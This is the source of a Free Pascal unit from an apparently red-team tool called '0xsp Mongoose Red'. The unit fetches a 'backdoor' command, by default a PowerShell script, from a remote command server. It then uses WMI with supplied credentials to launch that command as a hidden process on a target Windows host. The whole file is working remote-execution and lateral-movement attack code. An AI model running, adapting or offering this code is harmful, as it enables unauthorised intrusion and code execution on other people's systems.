{

/'\_/`\
|     |   _     ___     __     _      _     ___    __
| (_) | /'_`\ /' _ `\ /'_ `\ /'_`\  /'_`\ /',__) /'__`\
| | | |( (_) )| ( ) |( (_) |( (_) )( (_) )\__, \(  ___/
(_) (_)`\___/'(_) (_)`\__  |`\___/'`\___/'(____/`\____)
                     ( )_) |
                      \___/'    RED 2.1

 project : 0xsp Mongoose Red
 title :   WMI unit using OLE
 Author :  Lawrence Amer
 Site  :   https://0xsp.com

}
unit wmi;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils,FPHTTPClient,comobj,activex,variants,core;




  const
  wbemFlagForwardOnly = $00000020;
  HIDDEN_WINDOW       = 0;

  procedure  GetWin32_ProcessInfo;

implementation




function getscript(url:string):string;    // get your script from remote web interface
var
  FPHTTPClient: TFPHTTPClient;
  Resultget : string;
begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   Resultget := FPHTTPClient.Get(url); // example https://pastebin.com/raw/wtf50XsX
   getscript := Resultget;
   Writeln('[+] Getting Shell....');
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;

end;

procedure  GetWin32_ProcessInfo;

var
  FSWbemLocator : OLEVariant;
  FWMIService   : OLEVariant;
  FWbemObjectSet: OLEVariant;
  FWbemObject   : OLEVariant;
  oEnum         : IEnumvariant;
  iValue        : LongWord;
  objProcess    : OLEVariant;
  objConfig     : OLEVariant;
  ProcessID     : Integer;
  backdoor : OLEVariant;
  username,password,host: OLEVariant;
  srvhost :string;
  i:integer;
begin;
  for i := 1 to paramcount do begin

        if(paramstr(i)='-username') then begin
         username := paramstr(i+1);
         writeln('[+] using username : '+'['+username+']'+' to authenticate');
        end;
        if(paramstr(i)='-password') then begin
         password := paramstr(i+1);

        end;
         if(paramstr(i)='-host') then begin
         host := paramstr(i+1);
         writeln('[!] trying to connect to '+host);
        end;
         if (paramstr(i)='-srvhost') then begin
          srvhost := paramstr(i+1);
         end;
         end;
       // -u username
                          // -p password
                         // -r mongoose web api end point API  {scripting page }



  backdoor := trim(getscript('http://'+srvhost+DEF_PORT+'/api/getcommands')); // getting remote backdoor to be executed default will be powershell script

  FSWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
  FWMIService   := FSWbemLocator.ConnectServer(host, 'root\CIMV2', username, password);
  FWbemObject   := FWMIService.Get('Win32_ProcessStartup');
  objConfig     := FWbemObject.SpawnInstance_;

  objConfig.ShowWindow := HIDDEN_WINDOW;
  objProcess    := FWMIService.Get('Win32_Process');
  objProcess.Create(backdoor, null, objConfig, ProcessID);
  Writeln(Format('Pid %d',[ProcessID]));
  writeln('[+] task has been created successfully  ..!');

  end;

end.

